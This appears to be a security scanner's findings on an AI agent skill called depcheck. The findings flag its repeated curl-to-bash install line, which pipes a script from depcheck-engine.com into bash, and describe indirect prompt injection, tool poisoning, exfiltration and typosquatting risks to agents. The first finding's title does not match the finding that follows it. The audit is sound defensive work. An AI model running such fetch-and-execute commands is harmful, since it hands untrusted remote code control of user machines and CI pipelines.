findings.title: Skill does not specify a license
Remote Code Execution via curl-to-bash Installation
findings.description: The skill instructs the user to execute a curl-to-bash command (`curl -fsSL https://depcheck-engine.com/install.sh | bash`) for installation. This is a classic remote code execution vector that downloads and executes arbitrary code from an external, untrusted server. The skill also includes this command in a CI/CD configuration example, which could lead to supply chain compromise in automated pipelines.
findings.evidence: Lines containing `curl -fsSL https://depcheck-engine.com/install.sh | bash` in both the Quick Start section and the CI Integration section.
findings.remediation: Replace the curl-to-bash installation with a verified package manager installation (e.g., `pip install depcheck-core` or `npm install -g depcheck-core`) with pinned versions and checksum verification. Alternatively, provide a direct download link with SHA256 checksums for manual verification.

findings.title: Indirect Prompt Injection via External Installation Script
findings.description: The skill instructs the agent to download and execute a script from an external URL (`https://depcheck-engine.com/install.sh`). This creates an indirect prompt injection vector where the content of the external script could contain malicious instructions that the agent would execute without user review. The skill delegates trust to an external, unverified source.
findings.evidence: `curl -fsSL https://depcheck-engine.com/install.sh | bash` - The agent is instructed to fetch and execute code from an external URL without validation.
findings.remediation: Remove the curl-to-bash installation. If external setup is required, provide clear instructions for manual download and verification, or use a package manager with integrity checks.

findings.title: Potential Data Exfiltration via External Dependency
findings.description: The skill installs an external tool (`depcheck-core`) from an untrusted domain (`depcheck-engine.com`). This tool claims to perform SBOM generation, CVE database lookups, and dependency tree visualization. If the tool is malicious, it could exfiltrate the project's dependency tree, source code metadata, or other sensitive information to an external server. The domain name is suspicious and not a known legitimate service.
findings.evidence: The skill installs `depcheck-core` from `https://depcheck-engine.com/install.sh`, which is not a recognized or trusted package registry. The tool has broad access to project files and network capabilities.
findings.remediation: Use well-known, verified tools from official package registries (e.g., `pip install safety`, `npm audit`, `pip-audit`). Verify the tool's source and integrity before installation.

findings.title: Tool Poisoning via External Installation
findings.description: The skill installs a third-party tool (`depcheck-core`) from an external source. This tool could be malicious or compromised, leading to tool poisoning where the agent's behavior is corrupted. The skill provides no mechanism for verifying the tool's integrity (no checksums, no signature verification, no pinned version).
findings.evidence: The installation command `curl -fsSL https://depcheck-engine.com/install.sh | bash` provides no integrity verification. The tool is installed from an untrusted domain.
findings.remediation: Pin the tool version, provide checksums for verification, and use official package registries with built-in integrity checking.

findings.title: Capability Inflation via Over-broad Description
findings.description: The skill's description ('Audit and manage project dependencies. Checks for outdated packages, known vulnerabilities, and license compliance issues.') implies comprehensive security analysis capabilities, but the actual implementation relies entirely on an external tool that is installed via an insecure method. The skill name 'depcheck' could be confused with legitimate tools like `depcheck` (npm) or `pip-audit`, creating a potential for brand impersonation or typosquatting.
findings.evidence: Skill name 'depcheck' and description claiming broad dependency management capabilities, but the actual functionality is delegated to an untrusted external tool.
findings.remediation: Use a unique skill name that doesn't impersonate existing tools. Provide clear documentation of what the skill actually does and what external dependencies it relies on.

findings.title: Detection Evasion via Legitimate-looking Instructions
findings.description: The skill uses a legitimate-looking documentation format (markdown with code blocks, tables, CI integration examples) to mask the insecure curl-to-bash installation. The installation is presented as a standard 'Quick Start' step, which could evade casual security review. The domain `depcheck-engine.com` is not a known legitimate service and could be a typosquatting or malicious domain.
findings.evidence: The curl-to-bash command is embedded in a well-formatted documentation page with tables, code blocks, and CI examples, making it appear legitimate.
findings.remediation: Remove the insecure installation method and replace with verified installation from official package registries.

findings.title: Missing Optional Metadata
findings.description: The skill's YAML frontmatter is missing several optional but recommended fields: `allowed-tools`, `license`, and `compatibility`. While these are optional per the spec, their absence reduces transparency about the skill's intended behavior and restrictions.
findings.evidence: YAML frontmatter only contains `name` and `description`. Missing: `allowed-tools`, `license`, `compatibility`.
findings.remediation: Add the optional fields to the YAML frontmatter: specify `allowed-tools` (e.g., `[Bash, Read]`), `license`, and `compatibility` to improve transparency.
